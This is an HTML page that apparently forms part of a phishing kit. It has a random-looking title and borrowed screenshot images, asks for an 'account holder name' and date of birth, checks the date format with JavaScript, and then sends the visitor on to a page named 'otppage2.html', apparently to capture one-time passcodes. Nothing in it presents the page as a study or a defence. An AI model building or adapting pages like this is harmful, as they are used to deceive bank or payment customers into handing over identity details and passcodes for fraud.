<!DOCTYPE html>
<html lang="en">
<head>
  <title>dehijlbrd</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
  <style>
    html, body {
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
      background-color: #FFFFFF;
      width: 98%;
      overflow-x: hidden;
    }

    img {
      width: 100%;
      max-width: 1000px;
      border-radius: 0px;
      margin-top: 10px;
    }

    .form-container {
      width: 90%;
      max-width: 400px;
      background: #ffffff;
      padding: 20px;
      border-radius: 10px;
      box-shadow: 0 0 0px rgba(0,0,0,0.1);
      margin: 0 auto;
    }

    .form-group {
      margin-bottom: 15px;
      text-align: left;
      position: relative;
    }

    label {
      font-weight: bold;
      display: block;
      margin-bottom: 5px;
      color: #030303c0;
      font-size: 13px;
    }

    input[type="text"] {
      width: 96%;
      padding: 10px;
      background-color: #e5e5e5fa;
      border: 1px solid #aeaeae;
      border-radius: 0px;
      font-size: 12px;
      color: #333;
    }

    .error-message {
      color: red;
      font-size: 11px;
      margin-top: 5px;
      display: none;
    }

    .submit-btn {
      margin-top: 20px;
      text-align: center;
    }

    .submit-btn a {
      background: #f09c19;
      color: #fff;
      font-size: 12px;
      font-weight: bold;
      padding: 8px 18px;
      text-align: center;
      border-radius: 6px;
      text-decoration: none;
      display: inline-block;
      transition: background 0.3s ease;
    }

    .submit-btn a:hover {
      background: #0f3f55;
    }

    .bottom-image {
      width: 105%;
      max-width: 2000px;
      border-radius: 0px;
      margin-top: 20px;
      display: block;
    }
  </style>
</head>
<body>

  <img src="https://i.ibb.co/vvzRc4ws/Screenshot-2025-04-20-08-31-47-89-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Meri Tasveer">

  <div class="form-container">
    <form onsubmit="return validateDOB()">
      <div class="form-group">
        <label for="name">Account holder name *</label>
        <input type="text" id="name" name="name" required>
      </div>

      <div class="form-group">
        <label for="dob">Date of Birth (DD/MM/YYYY) *</label>
        <input type="text" id="dob" name="dob" maxlength="10" placeholder="DD/MM/YYYY" required>
        <div class="error-message" id="dobError">Invalid date. Please enter DD/MM/YYYY correctly.</div>
      </div>

      <div class="submit-btn">
        <a href="#" onclick="submitIfValid()">Submit</a>
      </div>
    </form>

    <!-- New image added below submit button -->
    <img class="bottom-image" src="https://i.ibb.co/q3n4tF60/Screenshot-2025-04-20-09-17-33-68-40deb401b9ffe8e1df2f1cc5ba480b12.jpg" alt="Bottom Image">
  </div>

  <script>
    const dobInput = document.getElementById("dob");
    const dobError = document.getElementById("dobError");

    dobInput.addEventListener("input", function () {
      let value = dobInput.value.replace(/[^0-9]/g, "");
      if (value.length > 2 && value.length <= 4) {
        value = value.slice(0, 2) + "/" + value.slice(2);
      } else if (value.length > 4) {
        value = value.slice(0, 2) + "/" + value.slice(2, 4) + "/" + value.slice(4, 8);
      }
      dobInput.value = value;
      dobError.style.display = "none";
    });

    function validateDOB() {
      const dob = dobInput.value;
      const pattern = /^(\d{2})\/(\d{2})\/(\d{4})$/;
      const match = dob.match(pattern);

      if (!match) {
        dobError.style.display = "block";
        return false;
      }

      const day = parseInt(match[1]);
      const month = parseInt(match[2]);

      if (day < 1 || day > 31 || month < 1 || month > 12) {
        dobError.style.display = "block";
        return false;
      }

      dobError.style.display = "none";
      return true;
    }

    function submitIfValid() {
      if (validateDOB()) {
        window.location.href = "otppage2.html";
      }
    }
  </script>
</body>
</html>
